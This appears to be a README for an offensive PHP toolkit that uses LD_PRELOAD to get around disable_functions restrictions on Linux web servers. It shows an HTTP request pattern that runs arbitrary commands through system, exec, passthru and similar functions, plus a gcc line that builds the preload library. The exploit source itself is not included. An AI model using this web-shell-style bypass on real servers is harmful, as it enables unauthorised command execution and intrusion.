# LD_PRELOAD.php

One PHP file bypass disable_functions with LD_PRELOAD.  
Only support Linux.

CODE: [https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)  
Paper: [https://www.freebuf.com/web/192052.html](https://www.freebuf.com/web/192052.html)


# detect.php

Try to bypass disable_functions.

Detect disable_functions:
```
http://url/detect.php?action=test
```

Run COMMAND with specified function:
```
http://url/detect.php?action=[system|exec|passthru|shell_exec|popen|proc_open|ws|sa]&cmd=COMMAND
```


# bypass_disablefunc.c

```
gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so
```

